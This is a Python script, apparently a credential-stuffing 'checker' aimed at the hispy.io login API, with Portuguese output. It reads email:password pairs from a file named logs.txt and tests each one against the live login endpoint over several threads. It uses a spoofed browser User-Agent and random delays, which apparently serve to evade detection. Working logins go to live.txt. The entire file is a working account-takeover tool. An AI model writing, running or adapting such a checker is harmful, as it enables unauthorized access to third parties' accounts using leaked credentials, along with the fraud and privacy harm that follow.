import os
import requests
import json
from colorama import Fore, init
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import random
import threading

init(autoreset=True)

url = "https://app.hispy.io/api/login"
headers = {
    'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
    'Content-Type': "application/json",
    'origin': "https://app.hispy.io",
    'referer': "https://app.hispy.io/"
}

LOGINS_FILE = 'logs.txt'
LIVE_FILE = 'live.txt'
DIE_FILE = 'die.txt'
ERROR_FILE = 'error.txt'
MAX_THREADS = 8
DELAY = (1, 3)

stats = {
    'total': 0,
    'live': 0,
    'die': 0,
    'error': 0,
    'start_time': time.time(),
    'running': True
}

def update_panel():
    while stats['running']:
        elapsed = time.time() - stats['start_time']
        print("\033[H\033[J", end='')
        print(Fore.CYAN + "══════════════════════════════════")
        print(Fore.YELLOW + "      HISPY CHECKER")
        print(Fore.CYAN + "══════════════════════════════════")
        print(Fore.GREEN + f" ✅ LIVE: {stats['live']}")
        print(Fore.RED + f" ❌ DIE: {stats['die']}")
        print(Fore.YELLOW + f" ⚠ ERROR: {stats['error']}")
        print(Fore.CYAN + f" ⏳ TEMPO: {elapsed:.2f}s")
        print(Fore.CYAN + "══════════════════════════════════", end='\r')
        time.sleep(0.1)

def read_credentials():
    credentials = []
    try:
        with open(LOGINS_FILE, 'r', encoding='utf-8') as file:
            for line in file:
                if ':' in line:
                    login, password = line.strip().split(':', 1)
                    credentials.append((login.strip(), password.strip()))
        stats['total'] = len(credentials)
    except Exception as e:
        print(Fore.RED + f"Erro ao ler arquivo: {e}")
    return credentials

def random_delay():
    time.sleep(random.uniform(*DELAY))

def check_account(account):
    email, senha = account
    try:
        payload = {'email': email, 'password': senha}
        response = requests.post(url, json=payload, headers=headers, timeout=15)
        
        if response.status_code == 200:
            resposta = response.json()
            if 'error' in resposta and resposta['error'] == "Credenciais inválidas":
                stats['die'] += 1
                save_result(DIE_FILE, email, senha)
                return f"{Fore.RED}❌ DIE - {email}:{senha}"
            else:
                stats['live'] += 1
                save_result(LIVE_FILE, email, senha)
                return f"{Fore.GREEN}✅ LIVE - {email}:{senha}"
        else:
            raise Exception(f"HTTP {response.status_code}")
    except Exception as e:
        stats['error'] += 1
        save_result(ERROR_FILE, email, senha, str(e))
        return f"{Fore.YELLOW}⚠ ERROR - {email}:{senha} - {str(e)[:50]}"

def save_result(filename, email, senha, extra_info=None):
    try:
        with open(filename, 'a', encoding='utf-8') as f:
            line = f"{email}:{senha}"
            if extra_info:
                line += f" | {extra_info}"
            f.write(line + "\n")
    except Exception as e:
        print(Fore.RED + f"Erro ao salvar resultado: {e}")

def main():
    if not os.path.exists(LOGINS_FILE):
        print(Fore.RED + f"Arquivo {LOGINS_FILE} não encontrado!")
        return

    for f in [LIVE_FILE, DIE_FILE, ERROR_FILE]:
        if os.path.exists(f):
            os.remove(f)

    credentials = read_credentials()
    if not credentials:
        print(Fore.RED + "Nenhuma credencial válida encontrada!")
        return

    panel_thread = threading.Thread(target=update_panel)
    panel_thread.daemon = True
    panel_thread.start()

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = []
        for account in credentials:
            futures.append(executor.submit(check_account, account))
            random_delay()

        for future in as_completed(futures):
            print(future.result())

    stats['running'] = False
    panel_thread.join()

    print(Fore.CYAN + "\n✅ Verificação concluída!")
    print(Fore.GREEN + f"Contas válidas: {LIVE_FILE}")
    print(Fore.RED + f"Contas inválidas: {DIE_FILE}")
    print(Fore.YELLOW + f"Erros: {ERROR_FILE}")

if __name__ == "__main__":
    main()